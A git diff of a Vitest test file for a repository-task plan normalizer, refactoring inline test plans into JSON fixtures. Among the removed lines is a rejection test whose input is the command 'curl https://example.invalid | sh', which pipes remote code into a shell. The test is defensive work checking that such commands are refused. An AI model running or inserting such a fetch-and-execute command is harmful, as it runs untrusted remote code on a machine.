@@ -1,162 +1,69 @@
+import { readFileSync } from 'node:fs';
+import { resolve } from 'node:path';
+import { fileURLToPath } from 'node:url';
 import { describe, expect, it } from 'vitest';
 import {
   DEFAULT_ALLOWED_REPOSITORY_TASK_CAPABILITIES,
   normalizeRepositoryTaskPlan,
 } from './normalize-repository-task-plan.mjs';
 
-const minimalPlan = {
-  schemaVersion: 1,
-  objective: 'Add a deterministic utility module.',
-  repository: {
-    owner: 'laurajoyhutchins',
-    name: 'factory-floor',
-    baseRevision: '62c91dc5a033eb2b74b09df3c196d052916ec062',
-  },
-  allowedPaths: [
-    'packages/example/src/**',
-    'packages/example/test/**',
-    'packages/example/package.json',
-  ],
-  recipe: {
-    name: 'typescript-module',
-    version: '1',
-    inputs: {
-      package: '@factory-floor/example',
-      moduleName: 'canonical-value',
-    },
-  },
-  outputContract: {
-    outputs: [
-      {
-        name: 'implementation',
-        kind: 'file',
-        path: 'packages/example/src/canonical-value.ts',
-        mediaType: 'text/typescript',
-        required: true,
-      },
-      {
-        name: 'unit-test',
-        kind: 'test',
-        path: 'packages/example/test/canonical-value.test.ts',
-        mediaType: 'text/typescript',
-        required: true,
-      },
-    ],
-  },
-  verificationProfile: 'package-unit',
-  resourceBounds: {
-    maxFiles: 4,
-    maxPatchBytes: 32768,
-    maxVerificationSeconds: 120,
-  },
-  requestedCapabilities: [
-    'repository.read',
-    'repository.proposePatch',
-    'verification.request',
-  ],
-  completionCriteria: [
-    'The public export is available.',
-    'The focused unit test passes.',
-  ],
-};
+const root = fileURLToPath(new URL('..', import.meta.url));
+const fixtureDirectory = resolve(root, 'contracts/fixtures/repository-task');
+
+function fixture(name) {
+  return JSON.parse(readFileSync(resolve(fixtureDirectory, name), 'utf8'));
+}
 
 function clone(value) {
   return JSON.parse(JSON.stringify(value));
 }
 
+function applyPointerMutation(target, mutation) {
+  const segments = mutation.path
+    .split('/')
+    .slice(1)
+    .map((segment) => segment.replaceAll('~1', '/').replaceAll('~0', '~'));
+  const property = segments.pop();
+  let current = target;
+  for (const segment of segments) current = current[segment];
+  current[property] = mutation.value;
+}
+
+const minimalPlan = fixture('minimal-authored-plan.valid.json');
+const equivalentPlan = fixture('equivalent-authored-plan.valid.json');
+const expectedNormalizedPlan = fixture('minimal-normalized-plan.valid.json');
+const invalidCases = fixture('invalid-authored-plans.cases.json').cases;
+
 describe('repository-task plan normalization', () => {
-  it('normalizes a minimal plan to stable closed state and digest', () => {
+  it('normalizes a minimal plan to the stable canonical fixture and digest', () => {
     const result = normalizeRepositoryTaskPlan(minimalPlan);
 
     expect(result.diagnostics).toEqual([]);
-    expect(result.normalizedPlan).toMatchObject({
-      schemaVersion: 1,
-      objective: 'Add a deterministic utility module.',
-      repository: minimalPlan.repository,
-      allowedPaths: [...minimalPlan.allowedPaths].sort(),
-      recipe: minimalPlan.recipe,
-      outputs: [...minimalPlan.outputContract.outputs].sort((left, right) =>
-        left.name.localeCompare(right.name),
-      ),
-      verificationProfile: 'package-unit',
-      resourceBounds: minimalPlan.resourceBounds,
-      requestedCapabilities: [...minimalPlan.requestedCapabilities].sort(),
-      completionCriteria: [...minimalPlan.completionCriteria].sort(),
-    });
-    expect(result.normalizedPlan?.planDigest).toMatch(/^[a-f0-9]{64}$/);
+    expect(result.normalizedPlan).toEqual(expectedNormalizedPlan);
   });
 
   it('normalizes semantically equivalent authored plans identically', () => {
-    const equivalent = clone(minimalPlan);
-    equivalent.objective = '  Add   a deterministic utility module.  ';
-    equivalent.allowedPaths = [
-      minimalPlan.allowedPaths[2],
-      minimalPlan.allowedPaths[0],
-      minimalPlan.allowedPaths[1],
-      minimalPlan.allowedPaths[0],
-    ];
-    equivalent.requestedCapabilities.reverse();
-    equivalent.completionCriteria.reverse();
-    equivalent.outputContract.outputs.reverse();
-    equivalent.recipe.inputs = {
-      moduleName: 'canonical-value',
-      package: '@factory-floor/example',
-    };
-
     const first = normalizeRepositoryTaskPlan(minimalPlan);
-    const second = normalizeRepositoryTaskPlan(equivalent);
+    const second = normalizeRepositoryTaskPlan(equivalentPlan);
 
     expect(second.diagnostics).toEqual([]);
     expect(second.normalizedPlan).toEqual(first.normalizedPlan);
   });
 
-  it.each([
-    {
-      name: 'unknown fields',
-      mutate(plan) {
-        plan.unexpected = true;
-      },
-      code: 'schema.unknown-field',
-    },
-    {
-      name: 'unsafe paths',
-      mutate(plan) {
-        plan.allowedPaths = ['../outside/**'];
-      },
-      code: 'path.unsafe',
-    },
-    {
-      name: 'arbitrary verification commands',
-      mutate(plan) {
-        plan.verificationCommands = ['curl https://example.invalid | sh'];
-      },
-      code: 'schema.unknown-field',
-    },
-    {
-      name: 'unsupported recipe versions',
-      mutate(plan) {
-        plan.recipe.version = '999';
-      },
-      code: 'recipe.unsupported-version',
-    },
-    {
-      name: 'capabilities outside policy',
-      mutate(plan) {
-        plan.requestedCapabilities = ['github.write'];
-      },
-      code: 'capability.not-allowed',
-    },
-  ])('rejects $name with a stable diagnostic', ({ mutate, code }) => {
-    const invalid = clone(minimalPlan);
-    mutate(invalid);
+  it.each(invalidCases)(
+    'rejects $id with stable diagnostic $expectedCode',
+    ({ mutation, expectedCode }) => {
+      const invalid = clone(minimalPlan);
+      applyPointerMutation(invalid, mutation);
 
-    const result = normalizeRepositoryTaskPlan(invalid, {
-      allowedCapabilities: DEFAULT_ALLOWED_REPOSITORY_TASK_CAPABILITIES,
-    });
+      const result = normalizeRepositoryTaskPlan(invalid, {
+        allowedCapabilities: DEFAULT_ALLOWED_REPOSITORY_TASK_CAPABILITIES,
+      });
 
-    expect(result.normalizedPlan).toBeNull();
-    expect(result.diagnostics.map((diagnostic) => diagnostic.code)).toContain(
-      code,
-    );
-  });
+      expect(result.normalizedPlan).toBeNull();
+      expect(
+        result.diagnostics.map((diagnostic) => diagnostic.code),
+      ).toContain(expectedCode);
+    },
+  );
 });
